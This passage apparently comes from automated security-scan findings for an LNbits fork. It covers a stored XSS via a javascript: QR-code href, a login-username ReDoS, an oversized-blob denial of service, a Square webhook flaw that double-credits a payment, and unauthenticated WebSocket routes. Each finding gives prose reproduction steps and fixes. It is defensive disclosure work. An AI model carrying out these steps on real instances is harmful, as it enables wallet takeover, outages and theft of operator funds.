2. [lnbits/templates/components/lnbits-qrcode.vue:7–11](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components/lnbits-qrcode.vue#L7-L11)
   The QR svg is wrapped in <a :href="href" @click="clickQrCode" class="no-link full-width">. Vue 3.5.44 binds the href attribute verbatim (no URL sanitisation) and no .no-link CSS rule exists in the project to disable pointer events, so a click on the QR activates the anchor.
3. [lnbits/templates/components/lnbits-payment-list.vue:463–473](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components/lnbits-payment-list.vue#L463-L473)
   In the per-row payment details dialog (opened by props.expand on a row click), for every incoming pending payment with a bolt11 the template renders <lnbits-qrcode :value="props.row.extra.fiat_payment_request" :href="props.row.extra.fiat_payment_request"> whenever that extra key is present, trusting a value that came from the payment creator.
4. [lnbits/core/views/payment\_api.py:280–330](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L330)
   POST /api/v1/payments is guarded by require_base_invoice_key (invoice key suffices); for out=false the whole CreateInvoice, including the free-form extra dict, is handed to create_payment_request.
5. [lnbits/core/models/payments.py:289–304](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L289-L304)
   CreateInvoice.extra is `dict | None` with no key allow-list or value validation, so the caller chooses arbitrary keys such as fiat_payment_request.
6. [lnbits/core/services/payments.py:257–269](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L257-L269)
   create_wallet_invoice (reached from create_payment_request when no fiat_provider is given) passes extra=data.extra straight into create_invoice.
7. [lnbits/core/services/payments.py:658–693](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L658-L693)
   calculate_fiat_amounts starts from the caller's dict (`fiat_amounts = extra or {}`) and only adds keys, so attacker keys survive into CreatePayment(extra=extra).
8. [lnbits/core/crud/payments.py:261–282](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L261-L282)
   create_payment stores `extra = data.extra or {}` verbatim on the Payment and persists it with db.insert, which (unlike fetch/execute) does not run rewrite_values; the payload contains no '<' or '&' in any case.
9. [lnbits/core/views/payment\_api.py:197–229](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L197-L229)
   GET /api/v1/payments/paginated (the call the wallet UI makes via LNbits.api.getPayments) returns Page[Payment] objects whose `extra` dict includes the stored fiat_payment_request.
10. [lnbits/core/models/payments.py:121–125](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L121-L125)
   Payment.__init__ promotes extra['fiat_payment_request'] to payment_request, confirming the server treats this caller-supplied key as the authoritative user-facing payment URL.
11. [lnbits/static/js/components/lnbits-payment-list.js:170](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-payment-list.js#L170)
   mapPayment copies extra onto the row object unchanged (`extra: data.extra ?? {}`), so the stored value reaches the template binding; the list is re-fetched on every g.updatePayments websocket toggle (line 539).

## Impact
Script runs on the LNbits origin inside the wallet owner's authenticated session with no CSP. window.g.user exposes adminkey/inkey for all of the owner's wallets and the session cookie authenticates same-origin API calls, so the attacker can pay invoices from every wallet, rotate keys, create API tokens and change account data; if the owner is an admin (or an admin views the wallet via users.vue), admin settings are reachable as well. This crosses the invoice<->admin key and user<->user boundaries named in the threat model: receive-only key to full account/spend control.

## Reproduction steps
1. Attacker holds the victim wallet's invoice key (receive-only credential routinely exposed in public pay pages, PoS devices and shared-wallet grants). One API call with that key stores the payload as a pending incoming payment; no other precondition or configuration is needed and the invoice is a real bolt11 so it passes the isIn/isPending/bolt11 guard. The owner later clicks the payment row to open its details (the dialog defaults to showing the QR for pending incoming payments) and clicks the QR code, a routine action to open or copy a payment link; the anchor's javascript: href then executes in the owner's session. The tooltip reveals the raw href, which a careful victim might notice, but the click is the only interaction required. The payload persists until the invoice expires (default lightning_invoice_expiry) or the attacker re-posts it.

## Recommended fix
1. lnbits-qrcode binds an arbitrary string to an anchor href and its click handler only special-cases '' and http*, so non-http schemes such as javascript: are navigated by the browser. Fix criteria: The component must only emit an href whose scheme is on an allow-list (https, http, lightning, lnurl, bitcoin, or similar) and must suppress navigation for anything else (prevent default and fall back to copy). Verify that a payment whose extra.fiat_payment_request is 'javascript:alert(1)' renders a QR whose click does not execute script.
2. The payments API stores a caller-supplied free-form `extra` dict, including keys (fiat_payment_request) that the server and UI later treat as trusted system-generated data. Fix criteria: Reserved extra keys that are produced by LNbits itself (fiat_payment_request, fiat_method, hold_invoice, lnurl_response, etc.) must be stripped or rejected when supplied by API callers, and fiat_payment_request must be validated as an http(s) URL before being persisted or promoted to payment_request. Verify that an invoice created with an invoice key and extra.fiat_payment_request is stored without that key.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257407

---

# Unauthenticated login username reaches quadratic HTML-strip regex in DB layer, stalling the event loop

## Details
`Connection.rewrite_values` (lnbits/db.py:147-162) is a global "strip HTML" pass applied to every string parameter of `fetchone`, `fetchall`, `execute` and `fetch_page`. Its regex `<.*?>|&(...);` contains a lazy repeat followed by a literal. CPython's `re` engine (pyproject pins `>=3.10,<3.13`) implements `MIN_REPEAT_ONE` in the general case by attempting the tail (`>`) after each single-character extension, with no literal-skip optimisation for the lazy form (that optimisation exists only for greedy `REPEAT_ONE`). The compiled INFO charset `{<, &}` only skips start positions that are neither character. On an input consisting only of `<` characters (no `>`, no newline), every `<` start position scans to the end of the string before the branch fails, so the substitution costs ~n^2/2 engine steps.

The string reaches this sink from an unauthenticated network request: `POST /api/v1/auth` with body `{"username": "<<<<...", "password": "x"}`. `LoginUsernamePassword.username` has no length limit (models/users.py:373-375), unlike every other username field in that module (max_length=20); `login()` (auth_api.py:148-160) calls `get_account_by_username_or_email(data.username)` (crud/users.py:234-249) -> `Database.fetchone` -> `Connection.fetchone` -> `rewrite_values` (db.py:186, 153) before `_check_login_throttle` runs (auth_api.py:157), so the lookup is paid on every request regardless of prior failures. The slowapi default of 200 req/min per IP is irrelevant because one request suffices. Neither uvicorn (server.py:58-69) nor FastAPI bounds the request body; LNbits adds no body-size middleware on core routes (only the WASM routes use `_read_limited_body`, wasm_ext/routes/api.py:218), the Docker image exposes uvicorn directly, and the documented Caddy/nginx reverse-proxy snippets (docs/guide/installation.md:717-827) set no body limit (nginx's 1 MB default is still ample).

Because `re.sub` is synchronous and runs on the single asyncio event loop, the whole process stalls for the duration: every HTTP request, websocket, invoice listener, payment status check and scheduler task stops. A ~100 KB username costs on the order of 5e9 regex steps (tens of seconds to minutes of wall-clock); a 1 MB body is effectively an indefinite hang, and the attacker can repeat it. This is deterministic algorithmic complexity set by the attacker's input shape, not volumetric load.

The same sink is reachable from other inputs (the `search` query parameter via `parse_filters`, bounded only by URL length; `login_usr` when user-id-only auth is enabled; payment memos for key holders), but the login path is anonymous and enabled by default.

Assumption: behaviour of CPython's `re` module as described above (sre `MIN_REPEAT_ONE` general case in sre_lib.h) for Python 3.10-3.12; not verified by execution.

## Evidence
1. [lnbits/db.py:147–162](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L147-L162)
   Connection.rewrite_values compiles the pattern `<.*?>|&([a-z0-9]+|#[0-9]{1,6}|#x[0-9a-f]{1,6});` and runs re.sub over every str bound parameter. The lazy `<.*?>` branch, on an input made of `<` characters with no `>` and no newline, attempts the tail match once per consumed character from every `<` start position: O(n) per start, O(n^2) overall. The call is synchronous on the asyncio loop.
2. [lnbits/db.py:180–192](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L180-L192)
   Connection.fetchone applies rewrite_values to the parameters before executing, so every lookup by a user-supplied string pays the regex cost.
3. [lnbits/core/views/auth\_api.py:148–159](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L148-L159)
   POST /api/v1/auth (default-enabled username-password method) calls get_account_by_username_or_email(data.username) before the login throttle (_check_login_throttle) runs, so the lookup happens for every request.
4. [lnbits/core/models/users.py:373–375](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L373-L375)
   LoginUsernamePassword.username is a bare str with no max_length, unlike CreateUser.username (max_length=20).
5. [lnbits/core/crud/users.py:234–249](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L234-L249)
   get_account_by_username_or_email lowercases the raw string (linear) and binds it through db.fetchone -> Database.fetchone (db.py:354-361) -> Connection.fetchone -> rewrite_values; no length check anywhere on this path.
6. [lnbits/app.py:478–486](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L478-L486)
   The only request limiting is slowapi's default 200/minute per remote address; a single request is enough to trigger the stall. No middleware limits request body size on core routes.

## Impact
Complete, repeatable denial of service of the LNbits process (all API, UI, websocket, payment-processing and background tasks share the blocked event loop). No confidentiality or integrity impact.

## Reproduction steps
1. Anonymous attacker sends one HTTP POST to /api/v1/auth with a username of a few hundred kilobytes of '<' characters. No credentials, no user interaction, default configuration (username-password login enabled, no body limit). The regex runs synchronously on the event loop and blocks the entire process for seconds to minutes; the request can be repeated indefinitely.

## Recommended fix
1. rewrite_values applies a super-linear regex (lazy `<.*?>`) to arbitrary-length attacker-controlled strings on the event loop. Fix criteria: The DB layer must not perform super-linear work on bound parameters: either remove HTML stripping from the persistence layer (sanitise at render time) or use a linear pattern (e.g. a negated character class such as `<[^<>]*>`) and bound input length. Verify that a login request with a multi-megabyte username completes in linear time without stalling other requests.
2. LoginUsernamePassword.username (and other lookup inputs) accept unbounded strings although valid usernames/emails are short. Fix criteria: Login and other lookup payloads enforce a maximum length consistent with the stored field (e.g. 20 for usernames, a few hundred for emails) before any DB access; oversized values are rejected with 4xx.

---
**Severity:** HIGH
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257406

---

# UI customization size limit counts dict keys, letting any user persist an arbitrarily large blob that is JSON-parsed on the event loop on every request

## Details
`PATCH /api/v1/auth/ui` (lnbits/core/views/auth_api.py:605-616) is gated only by `check_account_exists`, reads the raw body with `await req.json()` (no body-size limit: LNbits adds none outside the WASM routes' `_read_limited_body`, and uvicorn ~=0.40.0/h11 impose none by default), merges it into `account.ui_customization`, then applies what is clearly meant as a ~1 MB bound: `if len(account.ui_customization or {}) > 1000 * 1024`. `len()` of a dict is its key count, so one key whose value is a multi-hundred-megabyte string or nested structure passes. `update_user_account` → `update_account` → `db.update` → `model_to_dict` (`json.dumps`, lnbits/db.py:691) persists it unbounded into `accounts.ui_customization` TEXT (migration m043); `Account.validate_fields()` checks only username/email/pubkey/external_id/id.

The stored blob is then re-read on every authenticated request by that user: `_check_account_exists` (decorators.py:312-352) and `check_user_exists` (:355-366) always call `get_account` → `SELECT * FROM accounts` → `dict_to_model` → `_safe_load_json` → `json.loads` (db.py:748, 758-760), run synchronously on the single asyncio event loop; only `check_account_id_exists` caches, and it caches just the `AccountId`. `get_user_from_account` (crud/users.py:262-291) copies the dict into `User`, which `GET /api/v1/auth` and every page (`base.html:105`, `user|tojson|safe`) serialise back. A ~300-byte request therefore costs the server a parse (and often a dump) of an attacker-sized blob — seconds of event-loop stall for all users per request, repeatable within the default slowapi limit of 200/minute per IP — and the DB file, backups and disk grow by whatever the attacker uploads (SQLite allows ~1 GB per value, PostgreSQL TEXT is unbounded). The admin route `GET /users/api/v1/user/{user_id}` (user_api.py:82-90) calls `get_user` and returns the full `User`, so an admin inspecting the attacker's account also receives the blob.

The defect is a mis-implemented limit (wrong measure), so the intended bound is clear. The sibling `PATCH /api/v1/auth` stores `UserExtra` (unbounded `str` fields such as `picture`) into the same table with no size check at all, so a complete fix must bound the serialised size of all account JSON columns.

## Evidence
1. [lnbits/core/views/auth\_api.py:605–616](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L605-L616)
   update_ui_customization: any authenticated account (check_account_exists), raw req.json() body merged into account.ui_customization; the guard `len(dict) > 1000 * 1024` counts keys, not bytes, so a single key with an arbitrarily large value passes and is persisted via update_user_account.
2. [lnbits/db.py:744–760](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L744-L760)
   dict_to_model handles `dict`-typed fields by `_safe_load_json(value)` → `json.loads` on the whole TEXT column, synchronously on the event loop, every time an Account row is fetched.
3. [lnbits/decorators.py:312–366](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L312-L366)
   _check_account_exists / check_user_exists fetch the full account from the DB on every request (get_account / get_account_by_username); no Account caching (check_account_id_exists caches only AccountId), so the oversized blob is parsed per request.
4. [lnbits/core/crud/users.py:147–160](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L147-L160)
   get_account does `SELECT * FROM accounts` into the Account model, pulling the ui_customization TEXT column through dict_to_model.
5. [lnbits/core/crud/users.py:262–290](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L262-L290)
   get_user_from_account copies the full ui_customization dict into every User object, which GET /api/v1/auth and page templates serialise back.
6. [lnbits/db.py:666–695](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L666-L695)
   model_to_dict json.dumps the dict field with no size bound; db.update writes it to the accounts.ui_customization TEXT column.
7. [lnbits/core/views/user\_api.py:82–90](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L82-L90)
   Admin route GET /users/api/v1/user/{user_id} calls get_user and returns the full User including the attacker's ui_customization blob, so the cost crosses to the admin.
8. [lnbits/core/models/users.py:191](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L191)
   Account.ui_customization is an unconstrained `dict` persisted as TEXT; validate_fields() does not bound it.

## Impact
Each ~300-byte authenticated request from the attacker makes the single-process server json.loads (and for /api/v1/auth and pages, json.dumps) an attacker-sized blob synchronously on the event loop, stalling every user's requests for the duration, repeatable within the default 200/minute rate limit; the accounts table, DB file, backups and disk grow without bound, which on SQLite/Postgres can stop the ledger from recording payments. No confidentiality or integrity effect.

## Reproduction steps
1. Any self-registered user (registration open by default) with a session or bearer token sends one PATCH /api/v1/auth/ui whose single key holds a very large value; no body-size limit exists on this route and the key-count check passes. Thereafter any small authenticated request by that user (or an admin viewing the account) triggers the amplified cost. No interaction or special condition required.

## Recommended fix
1. The size guard measures the number of top-level keys instead of the serialised payload size, so it does not bound what is stored. Fix criteria: Bound the serialised byte size of ui_customization (request body before parsing, and the merged result) to the intended limit, reject larger payloads with 400 before persisting, and validate that the body is a JSON object. Verify: a PATCH with a single 2 MB string value is rejected and nothing is stored.
2. Other account JSON columns written from user-controlled input (UserExtra via PATCH /api/v1/auth) have no serialised-size bound either, so the same storage sink remains reachable. Fix criteria: Apply a serialised-size (and per-field length) bound to every user-writable JSON/TEXT column on the accounts table, so no self-service endpoint can persist more than the intended limit.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257404

---

# Square checkout memo becomes payment note parsed as subscription metadata, double-crediting one payment

## Details
Square checkout invoices and Square subscription payments are distinguished in the webhook handler solely by the content of the Square Payment's `note`: `_handle_square_payment_event` (lnbits/core/views/callback_api.py:525-546) deserialises `payment.note` as a JSON list `[wallet_id, tag, subscription_request_id, link, memo]` and, if a wallet_id comes out, routes the event to `_handle_square_subscription_payment`, which mints a new fiat payment on that wallet for the webhook's `amount_money` and settles it.

For ordinary checkout invoices LNbits itself fills the payment link's `payment_note` with the invoice creator's memo (`SquareWallet._create_checkout_invoice`, square.py:468-469, `memo[:500]`). The memo is arbitrary text supplied by any invoice-key holder via `POST /api/v1/payments` (`require_base_invoice_key`, payment_api.py:282; `CreateInvoice.memo` max 640 chars, no format restriction). `create_payment_request` (payments.py:153-156) only rejects `extra.fiat_method == 'subscription'`; it passes the memo through to the provider (payments.py:201). Nothing authenticates the note as LNbits-generated: there is no `alan_action`-style marker (the checkout order's `metadata` carries `alan_action: invoice` but the handler never reads it), and the handler does not first check whether the payment's `order_id` already maps to a tracked `fiat_square_order_{order_id}` payment. The Square webhook HMAC (fiat_providers.py:169-196) proves Square sent the event; it says nothing about who wrote the note.

Attack: a self-registered user with an invoice key on their own LIGHTNING wallet W, on an instance with Square enabled, creates a Square fiat invoice for amount A with memo `["W",null,"x",null,"m"]`. LNbits stores a pending payment `fiat_square_order_{order_id}` and creates a payment link whose payment_note is that string. The user pays the link once (A fiat). Square sends `payment.updated` (status COMPLETED, note = the JSON list, amount_money = A). The handler sees wallet_id W, calls `_handle_square_subscription_payment`, finds no `fiat_square_payment_{payment_id}` (the checkout payment has a different checking id, so the UNIQUE(wallet, checking_id) constraint does not collide), and calls `create_fiat_invoice` for A on W with `fiat_method=subscription` and checking id `payment_{payment_id}`; `check_fiat_status` -> `get_invoice_status('payment_...')` -> GET /v2/payments/{id} -> COMPLETED -> payment SUCCESS, fee wallet credited, faucet debited (fiat_providers.py:60-64). The original checkout payment is untouched by the webhook branch, but the user polls the unauthenticated `GET /api/v1/payments/{payment_hash}` (payment_api.py:429-470 -> `update_pending_payment` -> `check_payment_status` -> `check_fiat_status`) or waits for `check_pending_payments`: `get_invoice_status('order_{order_id}')` -> order tenders -> the same Square payment -> COMPLETED -> credited again. One fiat payment of A yields 2A worth of sats on a withdrawable LIGHTNING wallet; the surplus is unbacked by the funding source (or drained from the operator's faucet wallet). Repeatable per invoice up to `square_limits.service_max_amount_sats`, unlimited in total. The user also controls `tag` (meta[1]) and `memo` of the minted payment.

Note that `SquareWallet.create_subscription` refuses to run while `settings.lnbits_running` is true (square.py:140-143, 'Subscription not supported for Square'), so in a live instance LNbits never produces a JSON-list note itself: the only live producer of the string this branch trusts is the user memo.

Dependency assumption (Square, remote service, API version pinned by `square_api_version` default 2026-01-22): CreatePaymentLink's `payment_note` is copied to the resulting Payment's `note`, and `payment.updated` events carry `note` and `amount_money`. The project's own code relies on exactly this propagation (`create_subscription` writes metadata to `payment_note` at square.py:171 and reads it back from `payment.note` at callback_api.py:527/566), and tests/api/test_callback_api.py ~440-460 models the event with those fields.

## Evidence
1. [lnbits/core/views/callback\_api.py:525–545](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L525-L545)
   _handle_square_payment_event takes the Square Payment from the signed payment.updated payload, parses its `note` with _deserialize_square_metadata and, if a wallet_id is present, routes to the subscription branch (528-533) instead of resolving the payment to the tracked checkout payment by order_id (535-545). No check that the note was produced by LNbits (the order's alan_action metadata is never read) or that the order is already a known fiat_square_order_{order_id} payment.
2. [lnbits/fiat/square.py:468–469](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/square.py#L468-L469)
   For ordinary checkout invoices LNbits sets the payment link's `payment_note` to the invoice creator's memo (memo[:500]). Square copies payment_note onto the resulting Payment's `note`, so the webhook's `note` is payer-controlled text.
3. [lnbits/core/views/callback\_api.py:686–710](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L686-L710)
   _deserialize_square_metadata accepts any JSON list and maps meta[0] to wallet_id, meta[1] to tag, meta[4] to memo; nothing authenticates the list as LNbits-generated.
4. [lnbits/core/views/callback\_api.py:603–657](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/callback_api.py#L603-L657)
   _handle_square_subscription_payment creates a brand-new fiat invoice on the note's wallet_id for amount_money.amount/100 with checking_id payment_{payment_id}, then check_fiat_status settles it by GET /v2/payments/{id} (status COMPLETED). The lookup at 620 uses fiat_square_payment_{id}, which never collides with the checkout payment's fiat_square_order_{order_id}, so the same Square payment is credited a second time.
5. [lnbits/fiat/square.py:224–238](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/square.py#L224-L238)
   get_invoice_status resolves both order_... (via order tenders) and payment_... checking ids to the same underlying Square payment, so the original checkout payment and the webhook-created duplicate both report success for one real payment.
6. [lnbits/core/services/payments.py:147–157](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L147-L157)
   create_payment_request is reachable with an invoice key (POST /api/v1/payments, require_base_invoice_key) and passes the user's memo and extra to create_fiat_invoice; only extra.fiat_method=='subscription' is rejected, the memo is free text up to 640 chars and is forwarded to the provider at line 201.
7. [lnbits/core/services/payments.py:711–723](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L711-L723)
   The original checkout payment is settled independently through check_payment_status -> check_fiat_status (unauthenticated GET /api/v1/payments/{payment_hash} via update_pending_payment, or the periodic check_pending_payments task), giving the first credit while the webhook branch produced the second.
8. [lnbits/fiat/square.py:140–143](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/square.py#L140-L143)
   create_subscription refuses while lnbits_running is true, so a live instance never emits a legitimate JSON-list payment_note; the subscription branch in the webhook handler is reachable only through payer-written notes.

## Impact
Direct loss of ledger integrity: every exploited payment credits the attacker twice for one fiat payment, creating unbacked sats (or draining the operator's faucet wallet) that can be spent through the funding source. Repeatable and attacker-sized up to the per-invoice limit, so operator funds are at serious risk.

## Reproduction steps
1. Attacker: any self-registered LNbits user holding the invoice key of their own wallet, on an instance with Square enabled and its webhook configured (the feature itself). Steps: create a Square fiat invoice with a JSON-list memo naming their wallet; pay the Square link once; wait for Square's signed payment.updated webhook, which mints and settles a second payment; poll GET /api/v1/payments/{hash} so the original is settled too. No race, no victim, no non-default configuration.

## Recommended fix
The Square webhook handler decides between 'checkout payment' and 'subscription payment' from the free-text Payment.note, which for checkout invoices LNbits populates from the user's memo; a note that parses as a metadata list therefore forges subscription metadata. Fix criteria: A Square payment that belongs to an order LNbits already tracks (fiat_square_order_{order_id}) must only ever settle that local payment, never mint a new one. Subscription metadata must come from a channel the payer cannot write (e.g. order metadata set by LNbits with an alan_action marker, or a server-side mapping keyed by Square subscription id), and user memo must not be placed in payment_note for checkout links. Verify: an invoice with a JSON-list memo paid once results in exactly one SUCCESS payment and one faucet debit.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-345](https://cwe.mitre.org/data/definitions/345.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257399

---

# Block explorer WebSocket routes ignore public-API setting and open per-txid Electrum connections

## Details
The block explorer router (`lnbits/core/views/blockexplorer_api.py`) gates every REST route with `_check_api_access` (lines 52-60), which requires a logged-in user unless the admin has enabled `lnbits_blockexplorer_public_api` (default False, described in the admin UI as 'Allow unauthenticated access to the block explorer API endpoints'). The three WebSocket routes in the same router — `/blockexplorer/api/v1/ws/blocks`, `/ws/address/{address}` and `/ws/tx/{txid}` (lines 140-186) — check only `lnbits_blockexplorer_enabled` and then `accept()` the socket, so an anonymous client can use the operator's Electrum backend for live address balance/history and transaction confirmation lookups even when the admin has explicitly restricted the explorer to authenticated users. `check_blockexplorer_public`/`check_blockexplorer_access` (decorators.py:642-663) apply the same restriction to the HTML pages, confirming the intended policy.

The bypass has a resource cost on top of the policy breach. `ws_tx` passes the unvalidated `txid` path parameter to `task_manager.register_ws_tx_queue` (task_manager.py:285-315), which creates a `TransactionTracker` and a dedicated task per distinct string. Each tracker opens its own outbound Electrum connection (electrum.py:923); when the server rejects the arbitrary txid, `_track_once` keeps the connection open for 10 s, returns False and `track()` reconnects for as long as the socket is held (electrum.py:901-929). An anonymous client holding N sockets with N distinct txids therefore holds N outbound TLS sessions to the configured server (Blockstream's public server by default) with a reconnect/TLS handshake every 10 s each. SlowAPI rate limiting (middleware.py:213) is an HTTP middleware and does not apply to WebSocket upgrades, so the admin's `lnbits_rate_limit_*` settings do not constrain this either.

The REST `/tx/{txid}` route (lines 103-108) also forwards an unvalidated txid to Electrum, but it is gated by `_check_api_access` and rate limited, and only reflects the server's error text in a JSON `detail`, so it is noted here rather than filed separately.

Related: the shared-tracker poisoning filed separately (ws-address-shared-tracker-poison) is reachable through the same unauthenticated `ws_address` route.

## Evidence
1. [lnbits/core/views/blockexplorer\_api.py:140–186](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/blockexplorer_api.py#L140-L186)
   ws_blocks, ws_address and ws_tx check only settings.lnbits_blockexplorer_enabled (default True) and then accept() the socket. Unlike every REST route in the same router (which depend on _check_api_access), they never consult lnbits_blockexplorer_public_api nor call check_user_exists; the router is mounted unconditionally in core/__init__.py:59.
2. [lnbits/core/views/blockexplorer\_api.py:52–59](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/blockexplorer_api.py#L52-L59)
   _check_api_access is the gate the REST routes use: when lnbits_blockexplorer_public_api is False (the default) it requires a logged-in user. The WS routes do not use it.
3. [lnbits/task\_manager.py:285–314](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/task_manager.py#L285-L314)
   register_ws_tx_queue performs no validation of txid and _get_tx_tracker creates a TransactionTracker plus a dedicated task per distinct txid string.
4. [lnbits/utils/electrum.py:895–930](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/utils/electrum.py#L895-L930)
   Each TransactionTracker opens its own ElectrumClient connection; when the server rejects the (arbitrary) txid, _track_once sleeps 10 s with the connection open, returns False, and track() reconnects indefinitely while the WS stays open — one outbound TLS session per attacker-chosen txid.
5. [lnbits/settings.py:908–910](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L908-L910)
   lnbits_blockexplorer_public_api defaults to False; its UI description (static/i18n/en.js:1138) is 'Allow unauthenticated access to the block explorer API endpoints', which the WS endpoints under /blockexplorer/api/v1 contradict.
